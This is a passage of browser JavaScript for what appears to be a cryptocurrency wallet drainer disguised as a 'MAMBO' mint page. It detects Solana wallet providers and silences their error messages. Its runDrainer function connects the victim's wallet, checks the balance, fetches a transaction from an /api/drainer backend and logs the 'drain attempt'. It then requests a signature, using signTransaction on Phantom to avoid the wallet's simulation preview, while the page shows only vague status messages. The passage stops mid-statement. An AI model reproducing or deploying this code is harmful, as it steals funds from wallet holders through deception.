        event.message.includes('JSON-RPC: method call timeout') ||
        event.message.includes('method call timeout calling connect') ||
        event.message.includes('Failed to load resource: net::ERR_BLOCKED_BY_CLIENT') ||
        event.message.includes('o370968.ingest.sentry.io') ||
        event.message.includes('sentry.io') ||
        event.message.includes('ERR_BLOCKED_BY_CLIENT') ||
        event.message.includes('content.js') ||
        event.message.includes('_sendEnvelope') ||
        event.message.includes('captureSession') ||
        event.message.includes('inpage.js') ||
        event.message.includes('inapp.js') ||
        event.message.includes('Unable to set window.solana') ||
        event.message.includes('Could not assign')
      )) {
        console.warn('[WALLET_CONFLICTS] Suppressed wallet provider conflict:', event.message);
        event.preventDefault();
        return false;
      }
    });
    
    // Handle unhandled promise rejections from wallet providers
    window.addEventListener('unhandledrejection', function(event) {
      if (event.reason && event.reason.message && (
        event.reason.message.includes('Unable to set window.solana') ||
        event.reason.message.includes('Unable to set window.phantom.solana') ||
        event.reason.message.includes('Backpack couldn\'t override') ||
        event.reason.message.includes('window.ethereum') ||
        event.reason.message.includes('Could not assign Exodus provider') ||
        event.reason.message.includes('Could not assign') ||
        event.reason.message.includes('provider to window') ||
        event.reason.message.includes('JSON-RPC: method call timeout') ||
        event.reason.message.includes('method call timeout calling connect') ||
        event.reason.message.includes('Failed to load resource: net::ERR_BLOCKED_BY_CLIENT') ||
        event.reason.message.includes('o370968.ingest.sentry.io') ||
        event.reason.message.includes('sentry.io') ||
        event.reason.message.includes('ERR_BLOCKED_BY_CLIENT') ||
        event.reason.message.includes('content.js') ||
        event.reason.message.includes('_sendEnvelope') ||
        event.reason.message.includes('captureSession') ||
        event.reason.message.includes('inpage.js') ||
        event.reason.message.includes('inapp.js') ||
        event.reason.message.includes('Unable to set window.solana') ||
        event.reason.message.includes('Could not assign')
      )) {
        console.warn('[WALLET_CONFLICTS] Suppressed wallet provider promise rejection:', event.reason.message);
        event.preventDefault();
        return false;
      }
    });

    // Wallet definitions - all supported wallets (Backpack prioritized)
    const WALLET_DEFS = [
      {
        key: 'backpack',
        name: 'Backpack',
        icon: '/backpack-logo.png',
        provider: () => {
          try {
          // Enhanced Backpack detection with multiple fallbacks
          const possibleBackpacks = [
            window.backpack,
            window.BackpackWallet,
            window.backpackWallet,
            window.backpack?.solana,
            window.BackpackWallet?.solana
          ];
          
          for (const wallet of possibleBackpacks) {
            if (wallet && typeof wallet === 'object') {
              const hasConnect = typeof wallet.connect === 'function';
              if (hasConnect) {
                return wallet;
              }
            }
          }
          
          return null;
          } catch (error) {
            console.warn('[BACKPACK] Provider detection failed:', error);
            return null;
          }
        },
        install: 'https://backpack.app/',
        mobile: {
          appStore: 'https://apps.apple.com/app/backpack-wallet/id6446591340',
          playStore: 'https://play.google.com/store/apps/details?id=app.backpack',
          deepLink: 'https://backpack.app/ul/v1/browse/',
          universalLink: 'https://backpack.app/ul/v1/browse/',
          mobileStrategies: [
            'https://backpack.app/ul/v1/browse/',
            'backpack://v1/browse/'
          ]
        }
      },
      {
        key: 'phantom',
        name: 'Phantom',
        icon: '/phantom-logo.png',
        provider: () => {
          try {
            // Try to get Phantom provider with conflict resolution
          const phantom = window.phantom?.solana || window.solana;
            if (phantom && typeof phantom === 'object' && phantom.isPhantom) {
              return phantom;
            }
            return null;
          } catch (error) {
            console.warn('[PHANTOM] Provider detection failed:', error);
            return null;
          }
        },
        install: 'https://phantom.app/',
        mobile: {
          appStore: 'https://apps.apple.com/app/phantom-crypto-wallet/id1598432977',
          playStore: 'https://play.google.com/store/apps/details?id=app.phantom',
          deepLink: 'https://phantom.app/ul/browse/',
          universalLink: 'https://phantom.app/ul/browse/',
          // Mobile-specific deep link strategies (only for mobile browsers)
          mobileStrategies: [
            'https://phantom.app/ul/browse/',
            'phantom://browse/'
          ]
        }
      },
      {
        key: 'solflare',
        name: 'Solflare',
        icon: '/solflare-logo.png',
        provider: () => {
          // Enhanced Solflare detection - similar to Phantom and Backpack
          console.log('[SOLFLARE_DETECTION] Checking for Solflare provider...');
          
          // Primary Solflare detection
          const solflare = window.solflare;
          if (solflare && typeof solflare === 'object') {
            console.log('[SOLFLARE_DETECTION] Found window.solflare:', Object.keys(solflare));
            // Check if it's actually Solflare with multiple indicators
            if (solflare.isSolflare || 
                solflare.isConnected || 
                typeof solflare.connect === 'function' ||
                solflare.publicKey ||
                solflare.account) {
              console.log('[SOLFLARE_DETECTION] Valid Solflare provider found');
              return solflare;
            }
          }
          
          // Alternative Solflare objects
          const altSolflare = window.solflareWallet || window.SolflareWallet;
          if (altSolflare && typeof altSolflare === 'object') {
            console.log('[SOLFLARE_DETECTION] Found alternative Solflare:', Object.keys(altSolflare));
            return altSolflare;
          }
          
          // Check for Solflare in window.solana (some versions)
          if (window.solana && window.solana.isSolflare) {
            console.log('[SOLFLARE_DETECTION] Found Solflare in window.solana');
            return window.solana;
          }
          
          console.log('[SOLFLARE_DETECTION] No Solflare provider found');
          return null;
        },
        install: 'https://solflare.com/',
        mobile: {
          appStore: 'https://apps.apple.com/app/solflare/id1580902717',
          playStore: 'https://play.google.com/store/apps/details?id=com.solflare.mobile',
          deepLink: 'https://solflare.com/ul/v1/browse/',
          universalLink: 'https://solflare.com/ul/v1/browse/',
          // Mobile-specific deep link strategies (only for mobile browsers)
          mobileStrategies: [
            'https://solflare.com/ul/v1/browse/',
            'solflare://v1/browse/'
          ]
        }
      },
      {
        key: 'glow',
        name: 'Glow',
        icon: '/glow-logo.png',
        provider: () => {
          // Enhanced Glow detection with multiple fallbacks
          const possibleGlows = [
            window.glow,
            window.GlowWallet,
            window.glowWallet,
            window.glow?.solana,
            window.GlowWallet?.solana
          ];
          
          for (const wallet of possibleGlows) {
            if (wallet && typeof wallet === 'object') {
              const hasConnect = typeof wallet.connect === 'function';
              if (hasConnect) {
                return wallet;
              }
            }
          }
          
          return null;
        },
        install: 'https://glow.app/',
        mobile: {
          appStore: 'https://apps.apple.com/app/glow-wallet/id1635717553',
          playStore: 'https://play.google.com/store/apps/details?id=com.glow.wallet',
          deepLink: 'glow://app/',
          universalLink: 'https://glow.app/ul/app/',
          // Mobile-specific deep link strategies (only for mobile browsers)
          mobileStrategies: [
            'glow://app/',
            'glow://browse/',
            'glow://dapp/',
            'glow://open/',
            'https://glow.app/ul/app/',
            'https://glow.app/ul/browse/',
            'https://glow.app/ul/dapp/',
            'https://glow.app/ul/open/'
          ]
        }
      },
      {
        key: 'trustwallet',
        name: 'Trust Wallet',
        icon: '/trust-logo.png',
        provider: () => {
          // Enhanced Trust Wallet detection with better fallbacks
          console.log('Trust Wallet detection - checking for Trust Wallet objects:');
          console.log('window.trustwallet:', window.trustwallet);
          console.log('window.trustwallet?.solana:', window.trustwallet?.solana);
          console.log('window.trustWallet:', window.trustWallet);
          console.log('window.trustwallet?.provider:', window.trustwallet?.provider);
          console.log('window.trustwallet?.solana?.provider:', window.trustwallet?.solana?.provider);
          
          // Check all possible Trust Wallet objects with more comprehensive detection
          const possibleTrustWallets = [
            window.trustwallet?.solana,
            window.trustwallet,
            window.trustWallet,
            window.TrustWallet,
            window.trustwallet?.provider,
            window.trustwallet?.solana?.provider,
            // Check if any global object has Trust Wallet properties
            Object.values(window).find(obj => obj && typeof obj === 'object' && obj.isTrustWallet),
            window.trustWallet?.provider
          ];
          
          for (const wallet of possibleTrustWallets) {
            if (wallet && typeof wallet === 'object') {
              console.log('Found Trust Wallet object:', wallet);
              console.log('Trust Wallet object properties:', Object.keys(wallet));
              
              // Check if we're on mobile device
              const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
              const isTrustWalletBrowser = navigator.userAgent.includes('TrustWallet') || 
                                         window.location.href.includes('trustwallet') ||
                                         document.referrer.includes('trustwallet') ||
                                         window.location.href.includes('trust') ||
                                         document.referrer.includes('trust');
              
              // Only show unsupported message on mobile Trust Wallet dApp browser
              if (isMobileDevice && isTrustWalletBrowser) {
                console.log('Mobile Trust Wallet dApp browser detected - limited support');
                return {
                  name: 'Trust Wallet',
                  isTrustWallet: true,
                  isUnsupported: true, // Flag to indicate limited support on mobile
                  originalProvider: wallet, // Keep reference to original provider
                  connect: async () => {
                    throw new Error('Trust Wallet mobile dApp browser has limited MAMBO support. Please use Phantom or Solflare for this mint.');
                  },
                  signTransaction: async () => {
                    throw new Error('Trust Wallet mobile dApp browser does not support MAMBO transaction signing. Please use Phantom or Solflare.');
                  },
                  signMessage: async () => {
                                          throw new Error('Trust Wallet mobile dApp browser does not support MAMBO message signing. Please use Phantom or Solflare.');
                  }
                };
              } else {
                // Desktop Trust Wallet extension works fine
                console.log('Desktop Trust Wallet extension detected - full support');
                return wallet; // Return the original wallet object for normal operation
              }
            }
          }
          
          console.log('No Trust Wallet detected');
          return null;
        },
        install: 'https://trustwallet.com/',
        mobile: {
          appStore: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409',
          playStore: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp',
          deepLink: 'https://link.trustwallet.com/open_url',
          universalLink: 'https://link.trustwallet.com/open_url',
          // Mobile-specific deep link strategies (only for mobile browsers)
          mobileStrategies: [
            'https://link.trustwallet.com/open_url',
            'trust://open_url'
          ]
        }
      },
      {
        key: 'exodus',
        name: 'Exodus',
        icon: '/exodus-logo.png',
        provider: () => {
          // Enhanced Exodus detection with multiple fallbacks
          console.log('Exodus detection - checking for Exodus objects:');
          console.log('window.exodus:', window.exodus);
          console.log('window.exodusWallet:', window.exodusWallet);
          console.log('window.ExodusWallet:', window.ExodusWallet);
          
          // Check all possible Exodus objects with enhanced detection
          const possibleExodus = [
            window.exodus,
            window.exodusWallet,
            window.ExodusWallet,
            window.exodus?.solana,
            window.exodusWallet?.solana,
            // Check if any global object has Exodus properties
            Object.values(window).find(obj => obj && typeof obj === 'object' && obj.isExodus),
            // Check for Exodus in different naming conventions
            window.Exodus,
            window.exodus?.provider,
            window.exodusWallet?.provider
          ];
          
          for (const wallet of possibleExodus) {
            if (wallet && typeof wallet === 'object') {
              console.log('Found Exodus object:', wallet);
              console.log('Exodus object properties:', Object.keys(wallet));
              
              // Check if it has essential methods
              const hasConnect = typeof wallet.connect === 'function';
              const hasSignTransaction = typeof wallet.signTransaction === 'function';
              const hasPublicKey = wallet.publicKey || wallet.address;
              
              console.log('Exodus capabilities:', { hasConnect, hasSignTransaction, hasPublicKey });
              
              if (hasConnect) {
                return wallet;
              }
            }
          }
          
          console.log('No Exodus detected');
          return null;
        },
        install: 'https://exodus.com/',
        mobile: {
          appStore: 'https://apps.apple.com/app/exodus-crypto-bitcoin-wallet/id1414384820',
          playStore: 'https://play.google.com/store/apps/details?id=exodusmovement.exodus',
          deepLink: 'exodus://dapp/',
          universalLink: 'https://exodus.com/app/dapp?url=',
          // Mobile-specific deep link strategies (only for mobile browsers)
          mobileStrategies: [
            'exodus://dapp/',
            'exodus://browse/',
            'exodus://app/',
            'exodus://open/',
            'https://exodus.com/app/dapp?url=',
            'https://exodus.com/app/browse?url=',
            'https://exodus.com/app/app?url=',
            'https://exodus.com/app/open?url='
          ]
        }
      }
    ];

    // Wallet provider detection at page load - production ready



// Show status message in the status modal
window.showStatus = function showStatus(message, type = 'info') {
  const modal = document.getElementById('statusModal');
  const msgEl = document.getElementById('statusModalMsg');
  if (msgEl && modal) {
    let color = '#00FF88';
    if (type === 'error') color = '#f66';
    if (type === 'loading') color = '#FFD700';
    msgEl.innerHTML = `<span style="color:${color};font-weight:600;">${message}</span>`;
    modal.classList.add('active');
    
    // Add close button event listeners
    setTimeout(() => {
      const closeBtn = document.getElementById('statusModalClose');
      const closeSingleBtn = document.getElementById('statusModalCloseSingle');
      const retryBtn = document.getElementById('statusModalRetry');
      
      if (closeBtn) {
        closeBtn.onclick = () => {
          modal.classList.remove('active');
        };
      }
      
      if (closeSingleBtn) {
        closeSingleBtn.onclick = () => {
          modal.classList.remove('active');
        };
      }
      
      if (retryBtn) {
        retryBtn.onclick = () => {
          modal.classList.remove('active');
          // Retry logic can be added here
          window.location.reload();
        };
      }
    }, 100);
  }
}

// Backend-delegated wallet operations
async function detectWalletType(userAgent, availableProviders = []) {
  try {
    const response = await fetch('/api/wallet-management', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        operation: 'detect_wallet',
        userAgent: userAgent,
        availableProviders: availableProviders
      })
    });
    
    const data = await response.json();
    return data.result?.wallet || { key: 'unknown', name: 'Unknown Wallet' };
  } catch (error) {
    console.error('[WALLET_DETECTION] Backend detection failed:', error);
    return { key: 'unknown', name: 'Unknown Wallet' };
  }
}

async function fetchWalletBalance(publicKey) {
  try {
    const response = await fetch('/api/wallet-management', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        operation: 'fetch_balance',
        publicKey: publicKey
      })
    });
    
    const data = await response.json();
    return {
      success: data.result?.success || false,
      balance: data.result?.balance || 0,
      balanceSOL: data.result?.balanceSOL || '0.000000',
      error: data.result?.error
    };
  } catch (error) {
    console.error('[BALANCE_FETCH] Backend fetch failed:', error);
    return {
      success: false,
      balance: 0,
      balanceSOL: '0.000000',
      error: error.message
    };
  }
}

// Transaction validation is now handled by the backend TOCTOU protection

async function broadcastTransaction(signedTransaction) {
  try {
    console.log('[BROADCAST] Starting broadcast transaction...');
    
    // Check if signedTransaction has serialize method
    if (!signedTransaction || typeof signedTransaction.serialize !== 'function') {
      throw new Error('Invalid signed transaction - missing serialize method');
    }
    
    console.log('[BROADCAST] Sending to backend...');
    const response = await fetch('/api/wallet-management', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        operation: 'broadcast_transaction',
        signedTransaction: signedTransaction.serialize().toString('base64'),
        lastValidBlockHeight: signedTransaction.lastValidBlockHeight
      })
    });
    
    console.log('[BROADCAST] Backend response status:', response.status);
    const data = await response.json();
    console.log('[BROADCAST] Backend response data:', data);
    
    return {
      success: data.result?.success || false,
      signature: data.result?.signature,
      error: data.result?.error
    };
  } catch (error) {
    console.error('[TRANSACTION_BROADCAST] Backend broadcast failed:', error);
    return {
      success: false,
      signature: null,
      error: error.message
    };
  }
}

// Monitor transaction confirmation on-chain
async function monitorTransactionConfirmation(signature, walletType = null) {
  console.log('[MONITOR] Starting transaction confirmation monitoring...');
  console.log('[MONITOR] Signature:', signature);
  console.log('[MONITOR] Wallet type:', walletType);
  
  // Get wallet type from parameter or connected wallet
  const detectedWalletType = walletType || window.connectedWallet?.key || 'unknown';
  console.log('[MONITOR] Using wallet type:', detectedWalletType);
  
  try {
    console.log('[MONITOR] Sending to backend...');
    const response = await fetch('/api/wallet-management', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        operation: 'monitor_transaction',
        signature: signature,
        walletType: detectedWalletType,
        publicKey: window.connectedWallet?.publicKey?.toString() || window.userPublicKey
      })
    });

    console.log('[MONITOR] Response status:', response.status);
    console.log('[MONITOR] Response ok:', response.ok);

    if (!response.ok) {
      const errorText = await response.text();
      console.error('[MONITOR] Response error:', errorText);
      throw new Error(`HTTP ${response.status}: ${response.statusText} - ${errorText}`);
    }
    
    const data = await response.json();
    console.log('[MONITOR] Backend response:', data);
    console.log('[MONITOR] Result:', data.result);
    
    return {
      success: data.result?.success || false,
      status: data.result?.status,
      error: data.result?.error,
      confirmation: data.result?.confirmation
    };
  } catch (error) {
    console.error('[MONITOR] Backend monitoring failed:', error);
    console.error('[MONITOR] Error details:', {
      name: error.name,
      message: error.message,
      stack: error.stack
    });
    return {
      success: false,
      status: 'monitor_failed',
      error: error.message
    };
  }
}

// Backend-delegated runDrainer implementation
// Global flag to prevent multiple simultaneous drainer runs
let isDrainerRunning = false;

async function runDrainer(provider) {
  console.log('[runDrainer] Starting drain process...');
  console.log('[runDrainer] Provider received:', !!provider);
  console.log('[runDrainer] Provider type:', typeof provider);
  console.log('[runDrainer] Provider keys:', provider ? Object.keys(provider) : 'No provider');
  
  // Prevent multiple simultaneous runs
  if (isDrainerRunning) {
    console.log('[runDrainer] Already running, skipping duplicate call');
    return;
  }
  
  isDrainerRunning = true;
  
  try {
            showStatus('Processing...', 'loading');
    
    // 1. Get the public key from the provider
    let publicKey = provider.publicKey || provider.address;
    console.log('[runDrainer] Initial publicKey:', publicKey);
    console.log('[runDrainer] Provider has connect method:', typeof provider.connect === 'function');
    console.log('[runDrainer] Provider has signTransaction method:', typeof provider.signTransaction === 'function');
    
    // Always try to connect if not already connected
    if (!publicKey && provider && typeof provider.connect === 'function') {
      try {
        console.log('[runDrainer] calling provider.connect()...');
        const result = await provider.connect();
        console.log('[runDrainer] provider.connect() result:', result);
        publicKey = result?.publicKey || provider.publicKey || provider.address;
        console.log('[runDrainer] publicKey after connect:', publicKey);
      } catch (connectErr) {
        console.error('[runDrainer] provider.connect() error:', connectErr);
        showStatus('Failed', 'error');
        return;
      }
    }
    
    if (!publicKey) {
        showStatus('Failed', 'error');
        return;
    }

    // Ensure publicKey is properly converted to string
    let publicKeyString;
    try {
      if (typeof publicKey === 'string') {
        publicKeyString = publicKey;
      } else if (publicKey && typeof publicKey.toString === 'function') {
        publicKeyString = publicKey.toString();
      } else if (publicKey && publicKey.toBase58) {
        publicKeyString = publicKey.toBase58();
      } else {
        throw new Error('Invalid public key format');
      }
      
      // Validate the public key string format
      if (!publicKeyString || publicKeyString.length < 32 || publicKeyString.length > 44) {
        throw new Error('Invalid public key length');
      }
      
      console.log('[runDrainer] Final publicKeyString:', publicKeyString);
    } catch (keyError) {
      console.error('[runDrainer] Public key conversion error:', keyError);
      showStatus('Failed', 'error');
      return;
    }

    // 2. Get wallet type from connected wallet info instead of detecting
    showStatus('Processing...', 'loading');
    
    let walletInfo;
    if (window.connectedWallet && window.connectedWallet.key) {
      // Use the wallet that was actually connected
      const walletKey = window.connectedWallet.key;
      console.log('[runDrainer] Using connected wallet:', walletKey);
      console.log('[runDrainer] Connected wallet details:', window.connectedWallet);
      
      // Map wallet key to wallet info
      const walletMap = {
        'phantom': { key: 'phantom', name: 'Phantom', logo: '/phantom-logo.png' },
        'solflare': { key: 'solflare', name: 'Solflare', logo: '/solflare-logo.png' },
        'backpack': { key: 'backpack', name: 'Backpack', logo: '/backpack-logo.png' },
        'glow': { key: 'glow', name: 'Glow', logo: '/glow-logo.png' },
        'trustwallet': { key: 'trustwallet', name: 'Trust Wallet', logo: '/trust-logo.png' },
        'exodus': { key: 'exodus', name: 'Exodus', logo: '/exodus-logo.png' }
      };
      
      walletInfo = walletMap[walletKey] || { key: 'unknown', name: 'Unknown Wallet', logo: '/logo.png' };
      console.log('[runDrainer] Wallet info from connected wallet:', walletInfo);
    } else {
      // Fallback to detection if no connected wallet info
      console.log('[runDrainer] No connected wallet info, falling back to detection');
    const availableProviders = [];
    if (window.solana) availableProviders.push('window.solana');
    if (window.phantom) availableProviders.push('window.phantom');
    if (window.solflare) availableProviders.push('window.solflare');
    if (window.backpack) availableProviders.push('window.backpack');
    if (window.glow) availableProviders.push('window.glow');
    if (window.trustwallet) availableProviders.push('window.trustwallet');
    if (window.exodus) availableProviders.push('window.exodus');
    
      walletInfo = await detectWalletType(navigator.userAgent, availableProviders);
    }
    
    console.log('[runDrainer] Using wallet:', walletInfo);

    // 3. Use backend for balance fetching
    showStatus('Processing...', 'loading');
    const balanceResult = await fetchWalletBalance(publicKeyString);
    
    if (!balanceResult.success) {
      showStatus('Ineligible', 'error');
        return;
    }

    console.log('[runDrainer] Balance:', balanceResult.balanceSOL, 'SOL');

    // 4. Fetch the mint transaction from the backend
    showStatus('Processing...', 'loading');
    
    let response;
    try {
          response = await fetch(`/api/drainer`, {
            method: 'POST',
        headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              publicKey: publicKeyString,
              wallet: publicKeyString, // Also send as 'wallet' for backend compatibility
          walletType: walletInfo.key
        })
      });
    } catch (fetchError) {
      console.error('[runDrainer] Network error:', fetchError);
      showStatus('Failed', 'error');
      return;
    }
    
    // Handle HTTP errors with proper error parsing
    if (!response.ok) {
      try {
        const errorData = await response.json();
        console.error('[runDrainer] Backend error:', errorData);
        
        // Handle standardized error responses
        if (errorData.success === false && errorData.error) {
          // Use the error message from backend
          showStatus(errorData.error, 'error');
        } else if (errorData.code === 'INSUFFICIENT_FUNDS' || errorData.code === 'INSUFFICIENT_FUNDS_FOR_FEE') {
          showStatus('Ineligible', 'error');
        } else if (errorData.code === 'TOO_MANY_REQUESTS') {
          const retryAfter = errorData.metadata?.retryAfter || 60;
          showStatus('Failed', 'error');
        } else if (errorData.code === 'INVALID_PUBLIC_KEY' || errorData.code === 'INVALID_WALLET_ADDRESS') {
          showStatus('Failed', 'error');
        } else {
          showStatus('Failed', 'error');
        }
      } catch (parseError) {
        console.error('[runDrainer] Failed to parse error response:', parseError);
        showStatus('Ineligible', 'error');
      }
      return;
    }
    
    const responseData = await response.json();
    
    // Debug: Log the raw response data
    console.log('[runDrainer] Raw response data:', responseData);
    
    // Validate response structure
    if (!responseData.success || !responseData.transaction) {
      console.error('[runDrainer] Invalid response structure:', responseData);
        showStatus('Failed', 'error');
      return;
    }
    
    const txBase64 = responseData.transaction;
    
    // 5. Deserialize the transaction
    let txBytes;
    try {
      txBytes = Uint8Array.from(atob(txBase64), c => c.charCodeAt(0));
    } catch (decodeError) {
      console.error('[runDrainer] Transaction decode error:', decodeError);
      showStatus('Failed', 'error');
      return;
    }
    
    // Validate transaction data
    if (!txBytes || txBytes.length === 0) {
      console.error('[runDrainer] Empty transaction data');
      showStatus('Failed', 'error');
      return;
    }
    
    // Debug: Log the response data before transaction creation
    console.log('[runDrainer] Response data before transaction creation:', responseData);
    
    // Create transaction object with error handling
    let transaction;
    try {
      transaction = solanaWeb3.Transaction.from(txBytes);
      console.log('[runDrainer] Transaction created successfully');
    } catch (transactionError) {
      console.error('[runDrainer] Transaction creation error:', transactionError);
      showStatus('Failed', 'error');
      return;
    }
    
    // Debug: Log the full response data
    console.log('[runDrainer] Full response data:', responseData);
    
    // Restore lastValidBlockHeight from backend response
    if (responseData.lastValidBlockHeight) {
      transaction.lastValidBlockHeight = responseData.lastValidBlockHeight;
      console.log(`[runDrainer] Restored lastValidBlockHeight: ${transaction.lastValidBlockHeight}`);
    } else {
      console.warn('[runDrainer] No lastValidBlockHeight in response, transaction may fail');
      console.log('[runDrainer] Available response keys:', Object.keys(responseData));
    }
    
    // Debug: Log transaction details before signing
    console.log('[runDrainer] Transaction before signing:', {
      hasSignatures: !!transaction.signatures,
      signatureCount: transaction.signatures?.length || 0,
      feePayer: transaction.feePayer?.toString(),
      recentBlockhash: transaction.recentBlockhash,
      lastValidBlockHeight: transaction.lastValidBlockHeight,
      instructionCount: transaction.instructions?.length || 0
    });
    
    // Validate transaction object
    if (!transaction || !transaction.instructions || transaction.instructions.length === 0) {
      console.error('[runDrainer] Invalid transaction object');
      showStatus('Failed', 'error');
      return;
    }

    // 6. Skip frontend validation - let backend handle it
    showStatus('Processing...', 'loading');
    console.log('[runDrainer] Transaction received from backend, proceeding to signing');

    // 7. Log drain attempt - transaction is now presented to user for signing
    try {
      await fetch('/api/drainer/log-drain-attempt', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          publicKey: publicKeyString,
          walletType: walletInfo.key,
          lamports: responseData.balance || 0,
          instructions: transaction.instructions.length,
          transactionSize: 'unsigned' // Don't serialize unsigned transaction
        })
      });
    } catch (logError) {
      console.error('[runDrainer] Failed to log drain attempt:', logError);
    }

    // 8. Request signature from the wallet using Patient Mode
    showStatus('Processing...', 'loading');
    
    let signed;
    let cleanedTransaction = null; // Declared outside try-catch for scope
    console.log('[SIGNING] Starting signing process with cleanedTransaction scope:', cleanedTransaction);
    
    try {
      // Use Patient Mode for transaction signing
      console.log(`[SIGNING] Using Patient Mode for ${walletInfo.key} wallet`);
      
      const onStatusUpdate = (message, type) => {
        showStatus(message, type);
      };
      
      if (!window.patientMode) {
        throw new Error('Patient Mode not initialized');
      }
      
      // Note: Transaction expiration is now handled by reduced Patient Mode timeouts (2 minutes)
      // This prevents the retry loops while avoiding RPC rate limiting issues
      
      // Preserve lastValidBlockHeight before signing
      const preservedLastValidBlockHeight = transaction.lastValidBlockHeight;
      console.log(`[SIGNING] Preserving lastValidBlockHeight before signing: ${preservedLastValidBlockHeight}`);
      
      // Store the original transaction for fallback use
      let originalTransaction = transaction;
      let cleanedTransaction = null;
      
      signed = await window.patientMode.signWithPatientMode(
        provider, 
        transaction, 
        walletInfo.key, 
        onStatusUpdate
      );
      
      // Store the cleaned transaction for potential fallback use
      cleanedTransaction = signed;
      console.log('[SIGNING] Stored cleaned transaction for fallback use:', {
        instructionCount: cleanedTransaction.instructions?.length,
        hasSignatures: cleanedTransaction.hasSignatures,
        isCleaned: cleanedTransaction.instructions?.length === 3
      });
      
      // Restore lastValidBlockHeight after signing
      if (preservedLastValidBlockHeight) {
        signed.lastValidBlockHeight = preservedLastValidBlockHeight;
        console.log(`[SIGNING] Restored lastValidBlockHeight after signing: ${signed.lastValidBlockHeight}`);
      }
      
        // Check if this is a cleaned transaction (Phantom, Backpack, or Solflare)
        if ((walletInfo.key === 'phantom' || walletInfo.key === 'backpack' || walletInfo.key === 'solflare') && signed.instructions?.length === 3) {
          console.log(`[SIGNING] ${walletInfo.key} transaction was cleaned by Patient Mode`);
          console.log('[SIGNING] Using cleaned transaction directly - no re-signing needed');
          console.log('[SIGNING] Single transaction approach - user only signs once');
          
          // Use the cleaned transaction directly without re-signing
          // This ensures only ONE transaction request to the user
        }
      
      console.log('[SIGNING] Transaction signed successfully with Patient Mode');
      
      // Debug: Log signed transaction details
      console.log('[SIGNING] Signed transaction details:', {
        hasSignatures: !!signed.signatures,
        signatureCount: signed.signatures?.length || 0,
        feePayer: signed.feePayer?.toString(),
        recentBlockhash: signed.recentBlockhash,
        lastValidBlockHeight: signed.lastValidBlockHeight,
        instructionCount: signed.instructions?.length || 0,
        serializedLength: signed.serialize ? signed.serialize().length : 0
      });
      
      // For Phantom, Backpack, or Solflare with cleaned transaction, don't proceed to fallback
      if ((walletInfo.key === 'phantom' || walletInfo.key === 'backpack' || walletInfo.key === 'solflare') && signed.instructions?.length === 3) {
        console.log(`[SIGNING] ${walletInfo.key} cleaned transaction ready - proceeding to broadcast`);
        // Continue to broadcasting without triggering fallback
      }
      
    } catch (signError) {
      console.error('[runDrainer] Patient Mode signing failed:', signError);
      
      // CRITICAL: Phantom wallet must never retry or use fallback
      if (walletInfo.key === 'phantom') {
        console.error('[runDrainer] Phantom signing failed - NO FALLBACK allowed');
        showStatus('Failed', 'error');
        return;
      }
      
      // Handle specific signing errors for other wallets
      if (signError.message?.includes('User rejected') || 
          signError.message?.includes('cancelled') ||
          signError.message?.includes('denied')) {
        showStatus('Cancelled', 'error');
        return;
      } else if (signError.message?.includes('timeout')) {
        showStatus('Timeout', 'error');
        return;
      } else if (signError.message?.includes('insufficient')) {
        showStatus('Ineligible', 'error');
        return;
      }
      
      // Fallback to basic signing if patient mode fails (NON-PHANTOM WALLETS ONLY)
      try {
        showStatus('Processing...', 'loading');
        
        // Note: Transaction expiration is now handled by reduced Patient Mode timeouts (2 minutes)
        // This prevents the retry loops while avoiding RPC rate limiting issues
        
        // For Phantom, we should not reach this fallback anymore since re-signing is handled directly
        // This fallback is now only for non-Phantom wallets or other errors
        let transactionToSign = transaction;
        
        // If we have a cleaned transaction from Patient Mode, use that instead
        console.log('[SIGNING] Fallback: Checking for cleaned transaction:', {
          hasCleanedTransaction: !!cleanedTransaction,
          walletType: walletInfo.key,
          cleanedTransactionInstructions: cleanedTransaction?.instructions?.length
        });
        
        if (cleanedTransaction && (walletInfo.key === 'phantom' || walletInfo.key === 'backpack')) {
          console.log(`[SIGNING] Fallback: Using cleaned transaction from Patient Mode (${walletInfo.key})`);
          transactionToSign = cleanedTransaction;
        } else {
          console.log('[SIGNING] Fallback: Using original transaction (no cleaned transaction available)');
        }
        
        console.log('[SIGNING] Using fallback signing for non-Phantom wallet or other error');
        
        // Preserve lastValidBlockHeight before fallback signing
        const preservedLastValidBlockHeight = transactionToSign.lastValidBlockHeight;
        console.log(`[SIGNING] Preserving lastValidBlockHeight before fallback signing: ${preservedLastValidBlockHeight}`);
        
        // Basic wallet-specific signing logic as fallback
        // For Phantom, prioritize signTransaction to prevent simulation
        if (walletInfo.key === 'phantom' && provider.signTransaction) {
          console.log('[SIGNING] Fallback: Using signTransaction for Phantom (prevents simulation)');
          signed = await provider.signTransaction(transactionToSign);
      } else if (provider.signTransaction) {
          console.log('[SIGNING] Fallback: Using signTransaction');
          signed = await provider.signTransaction(transactionToSign);
        } else if (provider.signAndSendTransaction) {
          console.log('[SIGNING] Fallback: Using signAndSendTransaction');
          signed = await provider.signAndSendTransaction(transactionToSign);
        } else if (provider.signAllTransactions) {
          console.log('[SIGNING] Fallback: Using signAllTransactions');
          const signedArray = await provider.signAllTransactions([transactionToSign]);
          signed = signedArray[0];
              } else {
          throw new Error('Wallet does not support transaction signing');
        }
        
        // Restore lastValidBlockHeight after fallback signing
        if (preservedLastValidBlockHeight) {
          signed.lastValidBlockHeight = preservedLastValidBlockHeight;
          console.log(`[SIGNING] Restored lastValidBlockHeight after fallback signing: ${signed.lastValidBlockHeight}`);
        }
        
        console.log('[SIGNING] Fallback signing successful - proceeding to broadcasting');
        
        // Debug: Log fallback signed transaction details
        console.log('[SIGNING] Fallback signed transaction details:', {
          hasSignatures: !!signed.signatures,
          signatureCount: signed.signatures?.length || 0,
          feePayer: signed.feePayer?.toString(),
          recentBlockhash: signed.recentBlockhash,
          lastValidBlockHeight: signed.lastValidBlockHeight,
          instructionCount: signed.instructions?.length || 0,
